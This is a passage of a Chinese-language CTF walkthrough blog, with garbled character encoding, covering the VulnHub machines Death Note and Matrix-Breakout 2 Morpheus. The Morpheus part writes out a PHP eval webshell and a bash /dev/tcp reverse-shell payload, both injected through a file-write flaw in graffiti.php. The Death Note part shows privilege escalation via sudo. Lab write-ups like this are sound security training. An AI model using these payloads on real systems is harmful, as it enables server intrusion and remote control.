<h2 id="3-ç™»å½•kira"><a href="#3-ç™»å½•kira" class="headerlink" title="3.ç™»å½•kira"></a>3.ç™»å½•kira</h2><p>çœ‹æ¥æˆ‘ä»¬è¿˜éœ€è¦æ‰¾æ‰¾ä¿¡æ¯ï¼Œæ ¹æ®<code>user.txt</code>æ–‡æœ¬ä¿¡æ¯ï¼Œæˆ‘ä»¬å¿…é¡»è¦æˆåŠŸç™»å½•<code>kira</code>çš„ç”¨æˆ·ï¼Œæ‰å¯ä»¥ææƒæ‹¿åˆ°æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿</p>
<p>é‚£æˆ‘ä»¬ç›´æ¥æœç´¢å½“å‰å…¨éƒ¨å«æœ‰kiraçš„æ–‡ä»¶æˆ–è€…ç›®å½•</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -name <span class="string">&quot;kira*&quot;</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221108222721847.png" alt="image-20221108222721847"></p>
<p>å‰ä¸¤ä¸ªå‰é¢è®¿é—®è¿‡æ²¡æƒé™</p>
<p>åé¢å››ä¸ªä¸‰ä¸ªå›¾ç‰‡ï¼Œæœ€åä¸€ä¸ªä¹Ÿè®¿é—®è¿‡ï¼Œä¹Ÿæ²¡æƒé™</p>
<p><img src="/post/vulnhub/image-20221108222833431.png" alt="image-20221108222833431"></p>
<p>é‚£å°±åªæœ‰ä¸€ä¸ªäº†</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/opt/L/kira-case</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹æœ‰æ— ä¿¡æ¯</p>
<p><img src="/post/vulnhub/image-20221108223018151.png" alt="image-20221108223018151"></p>
<p>å‘ç°å…¶ä¸ºä¸€ä¸ªç›®å½•ï¼Œä¸”å…¶ä¸‹æœ‰ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶</p>
<blockquote>
<p><code>the FBI agent died on December 27, 2006</code></p>
<p><code>1 week after the investigation of the task-force member/head.</code><br><code>aka.....</code><br><code>Soichiro Yagami&#39;s family .</code></p>
<p><code>hmmmmmmmmm......</code><br><code>and according to watari ,</code><br><code>he died as other died after Kira targeted them .</code></p>
<p><code>and we also found something in</code><br><code>fake-notebook-rule folder .</code><br>æ„æ€æ˜¯ï¼š</p>
<p>è”é‚¦è°ƒæŸ¥å±€ç‰¹å·¥äº 2006 å¹´ 12 æœˆ 27 æ—¥å»ä¸–</p>
<p>å·¥ä½œç»„æˆå‘˜&#x2F;è´Ÿè´£äººè°ƒæŸ¥å 1 å‘¨ã€‚<br>åˆåâ€¦â€¦<br>å…«ç¥å®—ä¸€éƒçš„å®¶äººã€‚</p>
<p>å—¯å—¯å—¯å—¯â€¦â€¦<br>æ ¹æ® Watari çš„è¯´æ³•ï¼Œ<br>åœ¨åŸºæ‹‰ç„å‡†ä»–ä»¬ä¹‹åï¼Œä»–æ­»äº†ï¼Œå…¶ä»–äººä¹Ÿæ­»äº†ã€‚</p>
<p>æˆ‘ä»¬è¿˜å‘ç°äº†ä¸€äº›ä¸œè¥¿<br>å‡ç¬”è®°æœ¬è§„åˆ™æ–‡ä»¶å¤¹</p>
</blockquote>
<p>çœ‹æ¥æˆ‘ä»¬éœ€è¦åˆ°<code>fake-notebook-rule</code>è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹å¯»æ‰¾ä¸€ç•ª</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -name <span class="string">&quot;fake-notebook-rule&quot;</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>æ‰¾æ‰¾ä½ç½®</p>
<p><img src="/post/vulnhub/image-20221108223338919.png" alt="image-20221108223338919"></p>
<p>å‘ç°åœ¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/opt/L/fake-notebook-rule</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹å…¶ä¸‹æ–‡ä»¶ä¿¡æ¯</p>
<p><img src="/post/vulnhub/image-20221108223431583.png" alt="image-20221108223431583"></p>
<p>å¤§æ¦‚æ„æ€çœ‹æ¥å°±æ˜¯è®©æˆ‘ä»¬ç”¨<code>cyberchef</code>å¯¹<code>case.wav</code>çš„å­—ç¬¦ä¸²è§£å¯†ã€ä¸€çœ¼<code>16</code>è¿›åˆ¶ï¼Œç›´æ¥æ‰‹åŠ¨è§£ç ç®—äº†ã€‘</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">63</span> <span class="number">47</span> <span class="number">46</span> <span class="number">7</span>a <span class="number">63</span> <span class="number">33</span> <span class="number">64</span> <span class="number">6</span>b <span class="number">49</span> <span class="number">44</span> <span class="number">6</span>f <span class="number">67</span> <span class="number">61</span> <span class="number">32</span> <span class="number">6</span>c <span class="number">79</span> <span class="number">59</span> <span class="number">57</span> <span class="number">6</span>c <span class="number">7</span>a <span class="number">5</span>a <span class="number">58</span> <span class="number">5</span>a <span class="number">70</span> <span class="number">62</span> <span class="number">43</span> <span class="number">41</span> <span class="number">3</span>d</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬è§£ç è¯•è¯•</p>
<p>è§£<code>16</code>è¿›åˆ¶</p>
<p><img src="/post/vulnhub/image-20221108223720859.png" alt="image-20221108223720859"></p>
<p>è§£ç <code>base64</code></p>
<p><img src="/post/vulnhub/image-20221108223847293.png" alt="image-20221108223847293"></p>
<blockquote>
<p>passwd : <code>kiraisevil</code> </p>
</blockquote>
<p>å¾—åˆ°<code>kira</code>å¯†ç </p>
<p>æˆ‘ä»¬ç›´æ¥ç™»å½•</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">su kira</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221108223953100.png" alt="image-20221108223953100"></p>
<p> ç™»å½•æˆåŠŸ</p>
<h2 id="4-ææƒ-1"><a href="#4-ææƒ-1" class="headerlink" title="4.ææƒ"></a>4.ææƒ</h2><p>æˆ‘ä»¬å…ˆçœ‹çœ‹<code>kira</code>èƒ½ä»¥ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œå“ªäº›å‘½ä»¤</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221108224111044.png" alt="image-20221108224111044"></p>
<p>å¥½å®¶ä¼™</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">ALL</span> : <span class="type">ALL</span>) <span class="keyword">ALL</span></span><br></pre></td></tr></table></figure>

<p>ä»£è¡¨ä»–å¯ä»¥ä»¥ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œä¸€åˆ‡å‘½ä»¤ï¼Œé‚£ä»–å°±ç›¸å½“äºç®¡ç†å‘˜äº†</p>
<p>æ‰§è¡Œ</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo su</span> </span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221108224357240.png" alt="image-20221108224357240"></p>
<p>ç›´æ¥æ— å¯†ç è¿›å…¥ç®¡ç†å‘˜ç”¨æˆ·</p>
<p>ç„¶åæŸ¥çœ‹åˆ°æ ¹ç›®å½•æŸ¥çœ‹<code>flag</code></p>
<p><img src="/post/vulnhub/image-20221108224501582.png" alt="image-20221108224501582"></p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">      ::::::::       ::::::::       ::::    :::       ::::::::       :::::::::           :::    :::::::::::       :::::::: </span><br><span class="line">    :+:    :+:     :+:    :+:      :+:+:   :+:      :+:    :+:      :+:    :+:        :+: :+:      :+:          :+:    :+: </span><br><span class="line">   +:+            +:+    +:+      :+:+:+  +:+      +:+             +:+    +:+       +:+   +:+     +:+          +:+         </span><br><span class="line">  +#+            +#+    +:+      +#+ +:+ +#+      :#:             +#++:++#:       +#++:++#++:    +#+          +#++:++#++   </span><br><span class="line"> +#+            +#+    +#+      +#+  +#+#+#      +#+   +#+#      +#+    +#+      +#+     +#+    +#+                 +#+    </span><br><span class="line">#+#    #+#     #+#    #+#      #+#   #+#+#      #+#    #+#      #+#    #+#      #+#     #+#    #+#          #+#    #+#     </span><br><span class="line">########       ########       ###    ####       ########       ###    ###      ###     ###    ###           ########       </span><br><span class="line"></span><br><span class="line">##########follow me on twitter###########<span class="number">3</span></span><br><span class="line">and share this screen shot and tag @KDSAMF</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>æ¸¸æˆç»“æŸ</strong></p>
<hr>
<h2 id="p-s-é¶æœºå½©è›‹"><a href="#p-s-é¶æœºå½©è›‹" class="headerlink" title="p.s.é¶æœºå½©è›‹"></a>p.s.é¶æœºå½©è›‹</h2><p>ä¹‹å‰æˆ‘ä»¬ä»¥<code>L</code>çš„èº«ä»½æŸ¥çœ‹<code>kira</code>ï¼Œå‘ç°ä»–åº•ä¸‹æœ‰ä¸ª<code>kira.txt</code>æ–‡æœ¬æ–‡ä»¶ï¼Œæˆ‘ä»¬æ— æƒè®¿é—®</p>
<p>ç°åœ¨æˆ‘ä»¬å¯ä»¥è®¿é—®çœ‹çœ‹</p>
<p><img src="/post/vulnhub/image-20221108224728118.png" alt="image-20221108224728118"></p>
<p>å‘ç°æ˜¯ä¸€ä¸²<code>base64</code>åŠ ç å­—ç¬¦</p>
<p>è§£ç çœ‹çœ‹</p>
<p><img src="/post/vulnhub/image-20221108224803164.png" alt="image-20221108224803164"></p>
<blockquote>
<p><code>please protect one of the following</code> </p>
<ol>
<li><p><code>L (/opt)</code></p>
</li>
<li><p><code>Misa (/var)</code></p>
</li>
</ol>
<p>  åªèƒ½é€‰å…¶ä¸€æ¥ä¿æŠ¤</p>
</blockquote>
<p><code>/opt</code>åº•ä¸‹çš„<code>L</code>ï¼Œæˆ‘ä»¬å·²ç»çœ‹è¿‡äº†</p>
<p>æˆ‘ä»¬çœ‹çœ‹<code>/var</code>ä¸‹çš„<code>Misa</code>æœ‰ä»€ä¹ˆ</p>
<p><img src="/post/vulnhub/image-20221108225235107.png" alt="image-20221108225235107"></p>
<blockquote>
<p><code>it is toooo late for misa</code><br>#å¯¹ç±³æ²™è€Œè¨€ï¼Œå·²ç»å¤ªè¿Ÿäº†</p>
</blockquote>
<p>æ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥å»çœ‹çœ‹<code>DEATH NOTE</code></p>
<hr>
<h1 id="äºŒã€MATRIX-BREAKOUTï¼š2-MORPHEUS-ä¸­çº§"><a href="#äºŒã€MATRIX-BREAKOUTï¼š2-MORPHEUS-ä¸­çº§" class="headerlink" title="äºŒã€MATRIX-BREAKOUTï¼š2 MORPHEUS[ä¸­çº§]"></a>äºŒã€MATRIX-BREAKOUTï¼š2 MORPHEUS[ä¸­çº§]</h1><p><strong>ã€ŠçŸ©é˜µçªç ´ã€‹:2 å¢¨è²æ–¯</strong></p>
<blockquote>
<p>æè¿°ï¼š<br><code>This is the second in the Matrix-Breakout series, subtitled Morpheus:1. Itâ€™s themed as a throwback to the first Matrix movie. You play Trinity, trying to investigate a computer on the Nebuchadnezzar that Cypher has locked everyone else out from, which holds the key to a mystery.</code><br><code>Difficulty: Medium-Hard</code></p>
<p>è¿™æ˜¯ Matrix-Breakout ç³»åˆ—ä¸­çš„ç¬¬äºŒéƒ¨ï¼Œå‰¯æ ‡é¢˜ä¸º Morpheus:1ã€‚å®ƒçš„ä¸»é¢˜æ˜¯å›å½’ç¬¬ä¸€éƒ¨ Matrix ç”µå½±ã€‚æ‚¨æ‰®æ¼” Trinityï¼Œè¯•å›¾è°ƒæŸ¥ Nebuchadnezzar ä¸Šçš„ä¸€å°è®¡ç®—æœºï¼ŒCypher å·²å°†å…¶ä»–äººæ‹’ä¹‹é—¨å¤–ï¼Œè€Œè¿™å°è®¡ç®—æœºæŒæ¡ç€è§£å¼€è°œå›¢çš„é’¥åŒ™ã€‚<br>éš¾åº¦ï¼šä¸­ç­‰éš¾åº¦</p>
</blockquote>
<p><img src="https://i0.wp.com/xnfood.com.tw/wp-content/uploads/20211012094553_22.jpeg" alt="æ‡¶äººåŒ…ã€‹ã€é§­å®¢ä»»å‹™ã€ç³»åˆ—é›»å½±å›é¡§ï¼Œ1 ~ 4 é›†è©³ç´°åŠ‡æƒ…ã€å¿ƒå¾— ..."></p>
<blockquote>
<p>wcç¡®å®æœ‰ä¸œè¥¿<br>å®åœ¨ä¸æ‡‚å¯ä»¥çœ‹è¿™ä¸ªç ”è®¨ä¼šè§†é¢‘<br><code>https://www.beyondtrust.com/webinars/attacking-and-defending-linux-breaking-out-of-the-matrix-edition#video-container</code><br>è™½ç„¶è¿™ä¸ªä¸æ˜¯è¿™ä¸ªé¶æœºçš„wpï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯ä»å…¶ä¸­è·å¾—å¾ˆå¤šæ€è·¯</p>
</blockquote>
<h2 id="ä¿¡æ¯æ”¶é›†-10"><a href="#ä¿¡æ¯æ”¶é›†-10" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å…ˆæ‰«æä¸€ä¸‹ç«¯å£</p>
<p><img src="/post/vulnhub/image-20221117130716527.png" alt="image-20221117130716527"></p>
<blockquote>
<p>å‘ç°<code>22</code>ç«¯å£å¼€æ”¾ï¼Œè¿è¡Œç€<code>ssh</code><br><code>80ï¼Œ81</code>ä¸¤ä¸ªç«¯å£éƒ½è¿è¡Œç€<code>http</code><br>ä½†æ˜¯ä¸¤è€…åå­—ä¸åŒï¼Œå¯ä»¥åˆ¤æ–­å‡º<br>ä½†æ˜¯80ç«¯å£å¯ä»¥ä»»æ„è®¿é—®ï¼Œ<code>81</code>ç«¯å£è®¿é—®éœ€è¦ä¸€å®šæƒé™</p>
</blockquote>
<p><img src="/post/vulnhub/image-20221117134302741.png" alt="image-20221117134302741"></p>
<blockquote>
<p>å‘ç°81ç«¯å£æ˜¯éœ€è¦ç™»å½•çš„</p>
</blockquote>
<p>ç„¶å<code>dirsearch</code>æ‰«ä¸€ä¸‹ç›®å½•</p>
<p><img src="/post/vulnhub/image-20221117130822881.png" alt="image-20221117130822881"></p>
<blockquote>
<p>å‘ç°ç½‘ç«™ç›®å½•ä¸‹æœ‰çˆ¬è™«åè®®ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®çœ‹çœ‹å…¶ä¸­æœ‰æ²¡æœ‰å…³é”®ä¿¡æ¯</p>
</blockquote>
<p><img src="/post/vulnhub/image-20221117131146601.png" alt="image-20221117131146601"></p>
<blockquote>
<p><code>There&#39;s no white rabbit here.  Keep searching!</code><br>æ„æ€æ˜¯ï¼šè¿™é‡Œæ²¡æœ‰ç™½å…”ã€‚ç»§ç»­æœç´¢ï¼ </p>
<p>#<code>white rabbit</code>å°±æ˜¯çˆ±ä¸½ä¸æ¢¦æ¸¸ä»™å¢ƒé‡Œçš„ï¼Œè·Ÿç€ç™½è‰²çš„å…”å­ï¼Œæ‰è¿›å…”å­æ´</p>
<p>çœ‹æ¥æ˜¯æœ‰ä¸ªå¼•å¯¼çš„ä¿¡æ¯ï¼Œä¼šå¸¦æˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªå¾ˆå…³é”®çš„ä¸œè¥¿</p>
</blockquote>
<p>å†ç”¨<code>whatweb</code>æŸ¥çœ‹ç½‘ç«™å¯æ˜¾ç¤ºçš„æ¡†æ¶</p>
<p><img src="/post/vulnhub/image-20221117131950416.png" alt="image-20221117131950416"></p>
<p>æ²¡æœ‰å•¥ä¿¡æ¯</p>
<p>æˆ‘ä»¬è®¿é—®ç½‘ç«™çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–ä¿¡æ¯</p>
<p><img src="/post/vulnhub/image-20221117131405964.png" alt="image-20221117131405964"></p>
<blockquote>
<p><code>Welcome to the Boot2Root CTF, Morpheus:1.</code></p>
<p><code>You play Trinity, trying to investigate a computer on the Nebuchadnezzar that Cypher has locked everyone else out of, at least for ssh.</code></p>
<p><code>Good luck! - @jaybeale from @inguardians</code><br>æ„æ€æ˜¯ï¼š<br>æ¬¢è¿æ¥åˆ°Boot2Root CTFï¼Œå¢¨è²æ–¯:1.</p>
<p>ä½ æ‰®æ¼”<code>Trinity</code>ï¼Œè¯•å›¾è°ƒæŸ¥å°¼å¸ƒç”²å°¼æ’’åŠå²›ä¸Šçš„ä¸€å°ç”µè„‘ï¼Œ<code>Cypher</code>æŠŠæ‰€æœ‰äººéƒ½é”åœ¨å¤–é¢ï¼Œè‡³å°‘å¯¹äº<code>ssh</code>ã€‚</p>
<p>ç¥ä½ å¥½è¿ï¼ -@jaybealefrom@inguardians </p>
<p>#Cypherç”µå½±ä¸­åæŠ—ç»„ç»‡çš„ä¸€ä¸ªå›å¾’ï¼Œä»–æŠŠåæŠ—ç»„ç»‡é”åœ¨é—¨å¤–ï¼Œæˆ‘ä»¬åˆè¦ç”¨åˆ°ssh<br>é‚£çœ‹æ¥sshç™»å½•çš„ç”¨æˆ·åä¸ºCypher</p>
</blockquote>
<p>ä¿¡æ¯è¿˜æ˜¯å¤ªå°‘äº†ï¼Œ<code>dirsearch</code>åªæ‰«åˆ°ä¸¤ä¸ªå¯ä»¥è®¿é—®ï¼Œå®åœ¨åˆ©ç”¨å¤ªå°‘</p>
<p>æ‰€ä»¥æˆ‘ä»¬æ¢ä¸ªæ‰«æå·¥å…·</p>
<h3 id="dirbuster"><a href="#dirbuster" class="headerlink" title="dirbuster"></a>dirbuster</h3><blockquote>
<p>DirBusteræ”¯æŒå…¨éƒ¨çš„Webç›®å½•æ‰«ææ–¹å¼ï¼Œç”¨æ¥æ¢æµ‹webæœåŠ¡å™¨ä¸Šçš„ç›®å½•å’Œéšè—æ–‡ä»¶</p>
</blockquote>
<p>è¿™é‡Œæˆ‘åˆ©ç”¨çš„æ˜¯</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/dirbuster/</span>wordlists/</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221119232447671.png" alt="image-20221119232447671"></p>
<p>æˆ‘é€šè¿‡<code>dirbuster</code>å·¥å…·æ‰«æåˆ°</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.80.131/graffiti.php</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221119232601421.png" alt="image-20221119232601421"></p>
<p>ã€çœ‹æ¥dirsearchçš„ç›®å½•å¤ªå°‘äº†ã€‘</p>
<p>è®¿é—®</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.80.131/graffiti.php</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221119234606473.png" alt="image-20221119234606473"></p>
<p>å‘ç°æ˜¯ä¸ªç•™è¨€ä¿¡æ¯çš„ä¸€ä¸ªç½‘ç«™</p>
<p>è€Œä¸”æˆ‘ä»¬è¯„è®ºçš„ä¿¡æ¯è¢«åŒ…å«åœ¨äº†<code>graffiti.php</code>æ–‡ä»¶ä¸­</p>
<p>çŒœæµ‹æ˜¯æ–‡ä»¶å†™å…¥</p>
<p>äºæ˜¯æŠ“åŒ…æŸ¥çœ‹</p>
<p><img src="/post/vulnhub/image-20230222151129426.png" alt="image-20230222151129426"></p>
<p>å‘ç°æ•°æ®ä¸º</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">message</span>=hello&amp;<span class="keyword">file</span>=graffiti.txt</span><br></pre></td></tr></table></figure>

<blockquote>
<p>messageä¸ºå†™å…¥ä¿¡æ¯</p>
<p>fileä¸ºå†™å…¥æ–‡ä»¶åç§°ï¼Œè€Œä¸”è¿˜æœ‰åç¼€åå­—</p>
</blockquote>
<p>é‚£ä¹ˆå¦‚æœä¿®æ”¹åé¢çš„æ–‡ä»¶åç§°ï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥å®ç°æ–‡ä»¶ä¸Šä¼ çš„æ•ˆæœï¼Œä¸Šä¼ ä¸€ä¸ªåŒ…å«æœ¨é©¬çš„æ–‡ä»¶</p>
<h3 id="ä¸€å¥è¯ğŸ"><a href="#ä¸€å¥è¯ğŸ" class="headerlink" title="ä¸€å¥è¯ğŸ"></a>ä¸€å¥è¯ğŸ</h3><p>é‚£å°±å†™ä¸€ä¸ªä¸€å¥è¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå†<code>url</code>ç¼–ç </p>
<p>äºæ˜¯æœ€å</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">message=%3C%3Fphp%20%40eval(%24_POST%5B<span class="string">&#x27;cmd&#x27;</span>%5D)%3B%20%3F%3E&amp;<span class="keyword">file</span>=hello.php</span><br></pre></td></tr></table></figure>

<p>å¦‚æœä½ æ˜¯å¼€äº†ç«ç»’ï¼Œé‚£ä½ å¯èƒ½ä¼šçœ‹åˆ°ï¼Œåˆšå‘é€å°±è¢«ç«ç»’æ£€æµ‹åˆ°ç½‘ç«™å­˜åœ¨ä¸€å¥è¯ğŸï¼Œä»£è¡¨ç¡®å®æ˜¯å¯ä»¥çš„</p>
<p>ç”¨<code>nc</code>ç›‘å¬åå¼¹<code>shell</code>ä¹Ÿæ˜¯ä¸€æ ·</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/172.22.204.2/1234 0&gt;&amp;1&#x27;&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">message</span>=%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>exec(%<span class="number">22</span>%<span class="number">2</span>Fbin%<span class="number">2</span>Fbash%<span class="number">20</span>-c%<span class="number">20</span>&#x27;bash%<span class="number">20</span>-i%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">26</span>%<span class="number">20</span>%<span class="number">2</span>Fdev%<span class="number">2</span>Ftcp%<span class="number">2</span>F<span class="number">172.22.204.2</span>%<span class="number">2</span>F1234%<span class="number">200</span>%<span class="number">3</span>E%<span class="number">261</span>&#x27;%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">3</span>F%<span class="number">3</span>E&amp;file=hello.php</span><br></pre></td></tr></table></figure>



<p>è®¿é—®<code>hello.php</code>æ–‡ä»¶</p>
<p><img src="/post/vulnhub/image-20230222152248020.png" alt="image-20230222152248020"></p>
<p>æ‹¿åˆ°<code>shell</code></p>
<p><img src="/post/vulnhub/image-20230222152313081.png" alt="image-20230222152313081"></p>
<h2 id="FLAG1"><a href="#FLAG1" class="headerlink" title="FLAG1"></a>FLAG1</h2><p>åˆ°æ ¹ç›®å½•</p>
<p><img src="/post/vulnhub/image-20230222152956576.png" alt="image-20230222152956576"></p>
<blockquote>
<p>Flag 1!</p>
<p>Youâ€™ve gotten onto the system.  Now why has Cypher locked everyone out of it?</p>
<p>Can you find a way to get Cypherâ€™s password? It seems like he gave it to<br>Agent Smith, so Smith could figure out where to meet him.</p>
<p>Also, pull this image from the webserver on port 80 to get a flag.</p>
<p>&#x2F;.cypher-neo.png</p>
<p>æ ‡å¿—1 !</p>
<p>ä½ å·²ç»è¿›å…¥ç³»ç»Ÿäº†ã€‚ä¸ºä»€ä¹ˆå¡å¼—æŠŠæ‰€æœ‰äººéƒ½é”åœ¨å¤–é¢?</p>
<p>ä½ èƒ½æƒ³åŠæ³•æ‹¿åˆ°å¡å¼—çš„å¯†ç å—?çœ‹æ¥ä»–æŠŠå®ƒç»™äº†<br>å²å¯†æ–¯æ¢å‘˜ï¼Œè¿™æ ·å²å¯†æ–¯å°±èƒ½æ‰¾åˆ°å’Œä»–è§é¢çš„åœ°æ–¹ã€‚</p>
<p>å¦å¤–ï¼Œä»ç«¯å£80çš„webæœåŠ¡å™¨ä¸Šæ‹‰å‡ºè¿™ä¸ªå›¾åƒæ¥è·å¾—ä¸€ä¸ªæ ‡å¿—ã€‚&#x2F;.cypher-neo.png</p>
</blockquote>
<p>æç¤ºæˆ‘ä»¬éœ€è¦ä»ç½‘ç«™ä¸Šæ‰¾åˆ°å›¾ç‰‡<code>.cypher-neo.png</code>ï¼Œæ‹¿åˆ°å…¶ä¸­çš„å¯†ç </p>
<p>ç›´æ¥wget</p>
<p><img src="/post/vulnhub/image-20230222153353400.png" alt="image-20230222153353400"></p>
<h2 id="FLAG2"><a href="#FLAG2" class="headerlink" title="FLAG2"></a>FLAG2</h2><p><img src="/post/vulnhub/image-20230222153942426.png" alt="image-20230222153942426"></p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
</search>
